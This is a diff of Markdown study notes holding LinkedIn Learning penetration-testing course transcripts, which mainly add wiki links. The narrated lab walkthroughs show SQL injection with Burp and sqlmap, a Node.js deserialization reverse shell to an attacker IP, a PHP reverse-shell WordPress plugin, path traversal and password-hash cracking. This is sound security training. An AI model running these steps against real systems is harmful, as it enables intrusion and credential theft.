+#### [Injecting SQL using Burp Suite](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=0)** - [Instructor] Burp Suite is a powerful tool, and we can use it directly to run an SQL injection attack.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=0)** - [Instructor] [[Burp Suite]] is a powerful tool, and we can use it directly to run an [[SQL]] injection attack.
 >
 > **[0:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=6)** Let's take a look at the Hack the Box Europa server, which we believe may have an SQL injection vulnerability.
 >
-> **[0:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=13)** Our preliminary enumeration has identified this server has a named admin portal called admin-portal.europacorp.htb.
+> **[0:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=13)** Our preliminary enumeration has identified this server has a named admin portal called admin-portal.europacorp.[[HackTheBox|htb]].
 >
 > **[0:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=23)** Let's set that up in our hosts file.
 >
@@ -1857,7 +1836,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Burp Suite]] (4), [[SQL]] (4)
+> **Frameworks & Libraries:** [[Burp Suite]] (4), [[SQL]] (4), [[HackTheBox|Htb]] (4)
 > **Env Vars:** sql (4), post (2)
 > **UI Navigation:** go to (2), open the (1)
 > **CLI Commands:** sudo (1), find (1)
@@ -1866,24 +1845,23 @@ created: 2026-05-02
 > **Definitions:** is a  (1)
 > **Prerequisites:** set up (1)
 
-#### Exploiting Node.js
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980)
+#### [Exploiting Node.js](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=0)** - [Narrator] Node.js is a web server technology built using Chrome's V8 JavaScript engine.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=0)** - [Narrator] [[Node.js]] is a web server technology built using Chrome's V8 [[JavaScript]] engine.
 >
 > **[0:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=7)** It uses an event driven non-blocking communications model that makes it lightweight and efficient and suitable for large scale web use.
 >
-> **[0:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=16)** This is supported by an open source library called npm.
+> **[0:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=16)** This is supported by an open source library called [[npm]].
 >
-> **[0:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=20)** Node.js is used to collect forms data, generate dynamic page content, and manipulate files and databases.
+> **[0:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=20)** Node.js is used to collect [[Forms]] data, generate dynamic page content, and manipulate files and [[Databases]].
 >
 > **[0:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=28)** A Node.js module is started using the node command at the command line and will associate to a port.
 >
 > **[0:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=36)** The module will be executed to process messages when a user connects to that port.
 >
-> **[0:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=41)** Node.js is a form of Java engine.
+> **[0:41](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=41)** Node.js is a form of [[Java]] engine.
 >
 > **[0:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=44)** The key difference between JavaScript and Node.js is that execution of JavaScript occurs at the client whereas Node.js runs JavaScript on the server.
 >
@@ -1891,7 +1869,7 @@ created: 2026-05-02
 >
 > **[1:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=60)** Our enumeration shows us that port 3000 is open and delivering the Node.js Express framework service.
 >
-> **[1:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=69)** Let's take a look at Celestial using Burp Suite.
+> **[1:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=69)** Let's take a look at Celestial using [[Burp Suite]].
 >
 > **[1:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=75)** We'll go to proxy, set intercept off, and open the browser.
 >
@@ -1917,7 +1895,7 @@ created: 2026-05-02
 >
 > **[2:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=148)** Let's change the number to five.
 >
-> **[2:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=154)** Remove the rest of the line and put a curly bracket closing.
+> **[2:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=154)** Remove the [[Representational State Transfer (REST)|rest]] of the line and put a curly bracket closing.
 >
 > **[2:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=160)** Okay, let's encode it as Base64 and we'll copy the resulting string.
 >
@@ -1929,13 +1907,13 @@ created: 2026-05-02
 >
 > **[3:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=194)** "Hey Akhtar, 5 + 5 is 55" We're now actively interacting with the Node.js server.
 >
-> **[3:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=202)** Let's take a look at ajinabraham's GitHub site where he provides a Node.js reverse shell.
+> **[3:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=202)** Let's take a look at ajinabraham's [[GitHub]] site where he provides a Node.js reverse shell.
 >
 > **[3:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=209)** We can see the usage instructions at the start of the code.
 >
 > **[3:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=213)** We can use this to gain shell access to the server.
 >
-> **[3:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=217)** I've already copied this in, so let's run the script with my IP address and use port 2222 for the reverse shell, and we'll use Python 2.7 for this, "njs.py 10.10.14.11" and "2222".
+> **[3:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=217)** I've already copied this in, so let's run the script with my IP address and use port 2222 for the reverse shell, and we'll use [[Python (Programming Language)|Python]] 2.7 for this, "njs.py 10.10.14.11" and "2222".
 >
 > **[3:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-node-js?u=76281980&t=237)** Okay, that provides an immediate eval function which we can use.
 >
@@ -1981,7 +1959,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Node.js]] (12), [[JavaScript]] (4), [[Burp Suite]] (3), web (2), data (2)
+> **Frameworks & Libraries:** [[Node.js]] (12), [[JavaScript]] (4), [[Burp Suite]] (3), [[npm]] (1), [[Forms]] (1)
 > **CLI Commands:** node (13), make (3), find (2), npm (1), python (1)
 > **File Paths:** node.js (12), njs.py (1), script.py (1), user.txt (1), documents/user.txt (1)
 > **Ports:** port 2222 (2), port 3000 (1), :3000 (1)
@@ -1990,8 +1968,7 @@ created: 2026-05-02
 > **Env Vars:** rce (1), nd_func (1)
 > **Tools:** command line (1), github (1)
 
-#### Injecting XML into a web page
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980)
+#### [Injecting XML into a web page](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-xml-into-a-web-page?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2029,25 +2006,23 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** data (1)
 > **Env Vars:** xml (7)
 > **UI Navigation:** open the (1)
 > **Speakers:** - xml (1)
 
-#### File access through a web application URL
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980)
+#### [File access through a web application URL](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=0)** - [Narrator] Easy Chat is a simple browser based chat server and we can use it to demonstrate how to exploit a web application in order to break into the system as a whole.
 >
-> **[0:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=10)** This is a Windows based application and I have it running on IP address, 192.168.1.149.
+> **[0:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=10)** This is a [[Windows]] based application and I have it running on IP address, 192.168.1.149.
 >
 > **[0:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=18)** There are a number of vulnerabilities in this application.
 >
 > **[0:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=22)** One of them enables us to use the URL to navigate to specific folders outside of the web root.
 >
-> **[0:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=29)** Let's connect to Easy Chat using Burp Suite's web browser.
+> **[0:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=29)** Let's connect to Easy Chat using [[Burp Suite]]'s web browser.
 >
 > **[0:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/file-access-through-a-web-application-url?u=76281980&t=33)** Go to proxy.
 >
@@ -2067,7 +2042,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (2), application (2), web (2), [[Burp Suite]] (2), web application (1)
+> **Frameworks & Libraries:** [[Windows]] (2), [[Burp Suite]] (2)
 > **UI Navigation:** go to (2), open the (1)
 > **Env Vars:** url (1), http (1)
 > **Versions:** 192.168.1 (2)
@@ -2080,14 +2055,13 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Understanding CMS targets
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980)
+#### [Understanding CMS targets](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=0)** - [Instructor] A content management system, or CMS, is most often seen as a web-based application, which provides a framework for rapid development of a website.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=0)** - [Instructor] A [[Content Management]] system, or CMS, is most often seen as a web-based application, which provides a framework for rapid development of a website.
 >
-> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=9)** Without needing to understand complex HTML constructs, it will have a number of modules.
+> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=9)** Without needing to understand complex [[HTML]] constructs, it will have a number of modules.
 >
 > **[0:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=16)** The first is the web content interface, which allows a user to add the text, images, video, audio and so on, required for their website.
 >
@@ -2095,11 +2069,11 @@ created: 2026-05-02
 >
 > **[0:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=34)** A CMS will have a database backend, which holds the content, and other capabilities, such as an administrative tool, wizards, logging, and so on.
 >
-> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=46)** One of the popular personal CMS systems is WordPress, designed for individuals to create their own personal website with an emphasis on third-party plugins and used extensively for blogging.
+> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=46)** One of the popular personal CMS systems is [[WordPress]], designed for individuals to create their own personal website with an emphasis on third-party plugins and used extensively for blogging.
 >
 > **[0:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=59)** The large ecosystem around WordPress means that users don't have to have specialized knowledge as whatever they need to do is likely available as a standard plugin.
 >
-> **[1:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=71)** Joomla! and Drupal are two of the more sophisticated content management systems.
+> **[1:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=71)** Joomla! and [[Drupal]] are two of the more sophisticated [[Content Management Systems (CMS)|content management systems]].
 >
 > **[1:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=76)** Often used by businesses, these have strong collaboration capabilities to enable distributed content development.
 >
@@ -2129,23 +2103,22 @@ created: 2026-05-02
 >
 > **[2:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=178)** From a pen testing perspective, by managing the technical content development, a CMS avoids many of the simpler mistakes that may occur in a hand-coded website.
 >
-> **[3:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=189)** However, CMSs have two features, which a pen tester will want to check for flaws, the ability to plug in active content, such as PHP, and the fact that many users may store sensitive information, such as credentials, unprotected in the backend database.
+> **[3:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/understanding-cms-targets?u=76281980&t=189)** However, CMSs have two features, which a pen tester will want to check for flaws, the ability to plug in active content, such as [[PHP]], and the fact that many users may store sensitive information, such as credentials, unprotected in the backend database.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** cms (8), web (4), database (3), [[WordPress]] (3), [[Content Management Systems (CMS)|Content management systems]] (3)
+> **Frameworks & Libraries:** [[WordPress]] (3), [[Content Management Systems (CMS)|Content management systems]] (3), [[Content Management]] (2), [[Drupal]] (2), [[HTML]] (1)
 > **Env Vars:** cms (8), html (1), php (1)
 > **Analogies:** such as (5)
 > **CLI Commands:** php (1)
 > **Prerequisites:** required to (1)
 > **Speakers:** - [instructor] (1)
 
-#### Getting into WordPress
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980)
+#### [Getting into WordPress](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=0)** - [Speaker] WordPress is a very popular content management system for individual and small business users.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=0)** - [Speaker] [[WordPress]] is a very popular [[Content Management]] system for individual and small business users.
 >
 > **[0:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=6)** However, it's not without its problems, both in the way it gets installed and also with some well publicized exploits.
 >
@@ -2167,7 +2140,7 @@ created: 2026-05-02
 >
 > **[0:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=56)** We'll start by enumerating the website at port 80 using Go Buster.
 >
-> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=63)** Go Buster Dir-U HTTP 10.10.10.61 minus w slash users slash share slash Wordlists slash d buster slash directory list lowercase 2.3 medium dot txt and we'll check for PHP files.
+> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=63)** Go Buster Dir-U HTTP 10.10.10.61 minus w slash users slash share slash Wordlists slash d buster slash directory list lowercase 2.3 medium dot txt and we'll check for [[PHP]] files.
 >
 > **[1:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=100)** Okay, we've found a number of PHP files and folders including WP content, WP login dot php.
 >
@@ -2205,7 +2178,7 @@ created: 2026-05-02
 >
 > **[3:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=211)** We can see that this takes a parameter called query.
 >
-> **[3:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=216)** Okay. We can use this to do an SQL map check for injection.
+> **[3:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=216)** Okay. We can use this to do an [[SQL]] map check for injection.
 >
 > **[3:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=220)** We know where the WordPress plugins are located and we can take a guess that it uses my sql so we can directly code the query and we'll do SQL MAP minus U HTTP 10.10.10.61
 >
@@ -2223,7 +2196,7 @@ created: 2026-05-02
 >
 > **[4:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=287)** SQL MAP finds that the perimeter query is vulnerable to injection, so it can now start to enumerate the site.
 >
-> **[4:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=295)** And the first thing we'll do is check the databases with a minus minus dbs SQL map retrieves eight databases using a blind SQL injection approach.
+> **[4:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=295)** And the first thing we'll do is check the [[Databases]] with a minus minus dbs SQL map retrieves eight databases using a blind SQL injection approach.
 >
 > **[5:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/getting-into-wordpress?u=76281980&t=308)** And interestingly we can see joomla here as well as WordPress.
 >
@@ -2237,7 +2210,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[WordPress]] (9), [[SQL]] (9), [[PHP]] (7), [[Databases]] (2), database (2)
+> **Frameworks & Libraries:** [[WordPress]] (9), [[SQL]] (9), [[PHP]] (7), [[Databases]] (2), [[Content Management]] (1)
 > **Env Vars:** sql (6), php (3), http (2), https (2), map (2)
 > **CLI Commands:** php (7), find (2), unzip (2), ssh (1), cd (1)
 > **Versions:** 10.10.10 (4), 2.3 (1), 10.61 (1)
@@ -2248,12 +2221,11 @@ created: 2026-05-02
 > **Speakers:** - [speaker] (1), - during (1), - and (1)
 > **UI Navigation:** click on (1)
 
-#### Shelling through WordPress
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980)
+#### [Shelling through WordPress](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=0)** - [Instructor] Let's log in to the admin portal of our own WordPress site.
+> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=0)** - [Instructor] Let's log in to the admin portal of our own [[WordPress]] site.
 >
 > **[0:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=5)** Admin, admin.
 >
@@ -2261,7 +2233,7 @@ created: 2026-05-02
 >
 > **[0:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=14)** And this provides the option of managing existing plugins, and adding new ones.
 >
-> **[0:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=20)** If we do some research on plugins, we find that they're little more than a PHP script.
+> **[0:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=20)** If we do some research on plugins, we find that they're little more than a [[PHP]] script.
 >
 > **[0:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/shelling-through-wordpress?u=76281980&t=26)** We already have access to Carly's PHP shell, so all we need to do, is add the standard WordPress header.
 >
@@ -2303,7 +2275,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[PHP]] (8), [[WordPress]] (4), web (1), data (1)
+> **Frameworks & Libraries:** [[PHP]] (8), [[WordPress]] (4)
 > **CLI Commands:** php (8), find (1)
 > **File Paths:** wplug.php (2), wphead.txt (1), nano/usr/share/webshells/php/php-reverse-shell.php (1)
 > **Env Vars:** php (3)
@@ -2311,8 +2283,7 @@ created: 2026-05-02
 > **Versions:** 192.168.1 (1)
 > **Speakers:** - [instructor] (1)
 
-#### Exploiting Joomla via SQL
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980)
+#### [Exploiting Joomla via SQL](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2328,13 +2299,13 @@ created: 2026-05-02
 >
 > **[0:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=39)** In fact, we're running version 1.1.5 of the jssupportticket ticket tool, so this alert isn't really relevant.
 >
-> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=46)** However, let's check out exploit-db.
+> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=46)** However, let's check out [[Exploit-DB]].
 >
 > **[0:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=50)** There are a number of exploits relating to jssupportticket.
 >
-> **[0:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=54)** Let's take a look at the SQL injection exploit for version 1.1.5.
+> **[0:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=54)** Let's take a look at the [[SQL]] injection exploit for version 1.1.5.
 >
-> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=63)** At the bottom of the exploit, we have the sqlmap details.
+> **[1:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=63)** At the bottom of the exploit, we have the [[SQLmap]] details.
 >
 > **[1:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=67)** Let's copy that and change it to point to our target URL.
 >
@@ -2342,9 +2313,9 @@ created: 2026-05-02
 >
 > **[1:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=77)** I've run this previously to prepare it so it runs through quickly this time and returns a successful injection point.
 >
-> **[1:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=84)** We can now run this again with the "--dbs" flag, and we'll list the databases.
+> **[1:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=84)** We can now run this again with the "--dbs" flag, and we'll list the [[Databases]].
 >
-> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=93)** We get the list of databases, not just Joomla, but all the databases in the SQL server.
+> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=93)** We get the list of databases, not just Joomla, but all the databases in the [[Microsoft SQL Server|SQL server]].
 >
 > **[1:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=99)** But let's select the Joomla database and check its tables.
 >
@@ -2360,13 +2331,13 @@ created: 2026-05-02
 >
 > **[2:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=134)** I've copied the hash and stored it in a file called "jmhash".
 >
-> **[2:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=142)** So let's use John the Ripper to crack it: "john jmhash", and we recover the password, which is "admin".
+> **[2:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=142)** So let's use [[John the Ripper]] to crack it: "[[John the Ripper|john]] jmhash", and we recover the password, which is "admin".
 >
-> **[2:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=157)** Web apps offer many opportunities for exploitation to penetration testers and third party plugins for content management systems are a good place to look for easy footholds.
+> **[2:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-joomla-via-sql?u=76281980&t=157)** Web apps offer many opportunities for exploitation to penetration testers and third party plugins for [[Content Management Systems (CMS)|content management systems]] are a good place to look for easy footholds.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Databases]] (3), [[SQL]] (1), [[Microsoft SQL Server|Sql server]] (1), database (1), web (1)
+> **Frameworks & Libraries:** [[Databases]] (3), [[Exploit-DB]] (1), [[SQL]] (1), [[SQLmap]] (1), [[Microsoft SQL Server|Sql server]] (1)
 > **Versions:** version 1 (2), 1.5 (2), 192.168.1 (1)
 > **Code Identifiers:** jm_users (2), joomla_db (1)
 > **Env Vars:** sql (2), url (1)
@@ -2380,8 +2351,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### What's next
-> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980)
+#### [What's next](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2389,7 +2359,7 @@ created: 2026-05-02
 >
 > **[0:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=3)** I hope you enjoyed learning about some advanced techniques in testing websites.
 >
-> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=9)** Web is a major attack surface, and protecting web applications is a critical part of the cybersecurity activities across governments and businesses, and it's a major component of the offensive security certified professional qualification.
+> **[0:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=9)** Web is a major attack surface, and protecting web applications is a critical part of the [[Cybersecurity]] activities across governments and businesses, and it's a major component of the offensive security certified professional qualification.
 >
 > **[0:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-s-next?u=76281980&t=25)** This course has given you a great foundation for testing web applications, but it's just one of many areas of security that you need to understand as a professional pen tester.
 >
